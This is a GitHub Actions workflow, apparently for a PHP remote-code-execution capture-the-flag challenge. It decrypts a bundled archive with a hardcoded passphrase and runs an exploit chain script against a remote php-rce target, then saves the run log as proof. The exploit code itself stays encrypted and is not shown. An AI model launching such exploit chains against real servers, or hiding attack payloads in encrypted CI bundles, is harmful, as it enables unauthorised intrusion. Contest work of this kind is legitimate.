name: Remote proof

on:
  push:
    branches:
      - cloudflare-ctf-final
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: cloudflare-ctf-proof
  cancel-in-progress: true

jobs:
  prove:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
      - name: Run the validated PHP 8.5.11 chain
        run: |
          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in cloudflare-ctf.enc -out /tmp/cloudflare-ctf.tar.gz -pass pass:cloudflare-ctf-run
          tar -C /tmp -xzf /tmp/cloudflare-ctf.tar.gz
          cd /tmp/cf-layout-bundle
          mkdir -p /tmp/cloudflare-php-ctf /tmp/layout-variants /tmp/cloudflare-proof
          python build_layout_variants.py b1-all-windows-20000-files160.bin /tmp/layout-variants >/tmp/layout-build.log
          set +e
          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --verify --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 /tmp/layout-variants/160-post-forge.bin --query-order 1234 --leak-length 0x18000 --pipeline-pairs --b1-attempts 6 --b2-attempts 6 > /tmp/cloudflare-proof/run.log 2>&1
          status=$?
          cat /tmp/cloudflare-proof/run.log
          exit "$status"
      - name: Preserve the proof transcript
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: cloudflare-proof
          path: /tmp/cloudflare-proof/run.log
          retention-days: 1
